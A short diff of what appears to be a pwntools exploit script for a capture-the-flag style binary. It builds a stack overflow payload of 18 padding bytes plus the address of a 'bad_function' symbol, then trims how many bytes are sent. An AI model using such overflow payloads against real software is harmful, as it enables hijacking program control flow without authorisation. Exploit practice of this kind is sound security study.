@@ -19,10 +19,10 @@ def main():
     offset = 18
     junk = b'A' * offset
 
-    payload  = junk
+    payload = junk
     payload += p64(context.binary.symbols.bad_function)
 
-    p.send(payload[:20])
+    p.send(payload[:19])
     p.interactive()
 
 
